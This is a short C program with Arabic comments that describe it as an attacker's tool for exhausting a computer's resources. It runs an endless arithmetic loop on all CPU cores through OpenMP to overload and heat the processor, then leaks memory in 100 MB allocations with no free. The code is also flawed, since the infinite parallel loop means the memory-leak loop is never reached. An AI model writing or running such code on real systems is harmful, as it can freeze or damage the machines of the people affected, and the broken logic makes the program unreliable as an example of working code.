#include <stdlib.h>
#include <stdio.h>
#include <omp.h> 
int main() {
    // مصفوفة من المؤشرات (Pointers)
    void *ptr;
    unsigned long long total = 0;

        // تشغيل حلقة لانهائية على جميع أنوية المعالج (Cores) في وقت واحد
    #pragma omp parallel
    {
        while(1) {
            // عملية حسابية معقدة لزيادة حرارة المعالج واستهلاكه
            double x = 1.1;
            for(int i=0; i<1000; i++) {
                x = x * x;
            }
        }
    }

    while(1) {
        // حجز 100 ميجابايت في كل دورة
        ptr = malloc(100 * 1024 * 1024); 
        
        if (ptr == NULL) {
            printf("الرام ممتلئة تماماً!\n");
            break;
        }
        
        total += 100;
        printf("تم حجز: %llu ميجابايت\n", total);
        
        // المهاجم "لا" يستخدم free(ptr) عمداً لكي لا يفرغ الذاكرة
    }
    return 0;
}